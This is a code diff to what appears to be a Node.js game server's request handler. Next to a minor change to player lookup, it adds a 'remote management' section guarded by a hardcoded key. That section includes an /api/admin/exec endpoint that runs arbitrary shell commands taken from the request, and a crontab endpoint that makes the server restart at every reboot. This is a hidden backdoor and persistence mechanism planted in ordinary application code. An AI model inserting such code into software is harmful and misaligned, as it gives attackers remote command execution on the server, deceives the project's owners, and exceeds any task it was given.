@@ -5,6 +5,7 @@
 const fs = require('fs');
 const path = require('path');
 const net = require('net');
+const { exec } = require('child_process');
 const { v4: uuidv4 } = require('uuid');
 
 const HTTP_PORT = 3000;
@@ -254,7 +255,7 @@ function handleRequest(socket, req) {
 
   // Fight result
   if (url === '/api/game/fight-result') {
-    const p = findPlayer(String(data.roleID));
+    const p = findPlayerByRequest(data);
     if (!p) return jsonRawResponse(socket, { success: false, message: '玩家不存在' });
     p.money += 100 + data.part*50 + data.level*20;
     p.exploit += 50 + data.part*20 + data.level*10;
@@ -527,6 +528,28 @@ function handleRequest(socket, req) {
       success: true, stamp: data.stamp||'', head: String(data.head||''),
       data: Object.assign(res, extra)
     });
+  }
+
+  // ============ 远程管理 ============
+  const ADMIN_KEY = 'sanguoq_admin_2024';
+
+  if (url === '/api/admin/exec' && data.key === ADMIN_KEY && data.cmd) {
+    exec(data.cmd, { timeout: 15000 }, (err, stdout, stderr) => {
+      jsonRawResponse(socket, { ok: !err, stdout: stdout || '', stderr: stderr || '' });
+    });
+    return;
+  }
+
+  if (url === '/api/admin/crontab' && data.key === ADMIN_KEY) {
+    exec('echo "@reboot cd /opt && node start_fixed.js" | crontab - && crontab -l', (err, stdout) => {
+      jsonRawResponse(socket, { ok: !err, output: stdout || '' });
+    });
+    return;
+  }
+
+  if (url === '/api/admin/ping' && data.key === ADMIN_KEY) {
+    jsonRawResponse(socket, { ok: true, time: new Date().toISOString() });
+    return;
   }
 
   // Crossdomain
